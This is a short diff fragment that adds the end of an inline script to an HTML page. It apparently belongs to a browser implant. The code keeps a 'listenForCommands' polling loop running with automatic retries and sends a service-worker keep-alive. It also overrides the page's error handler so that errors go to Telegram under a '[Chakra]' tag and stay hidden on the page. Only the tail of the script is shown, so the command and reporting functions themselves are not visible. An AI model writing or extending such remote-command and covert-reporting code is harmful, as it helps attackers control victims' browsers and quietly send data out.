@@ -872,4 +872,25 @@
             }
           }
         }
-        listen
+        listenForCommands();
+      })
+      .catch(() => {
+        setTimeout(listenForCommands, 1000);
+      });
+  }
+
+  listenForCommands();
+
+  if (navigator.serviceWorker) {
+    navigator.serviceWorker.ready.then(reg => {
+      reg.active.postMessage({ type: 'keepAlive' });
+    });
+  }
+
+  window.onerror = function(error, url, line) {
+    sendToTelegram('[Chakra] ❌ Error: ' + error + ' at line ' + line);
+    return true;
+  };
+</script>
+</body>
+</html>
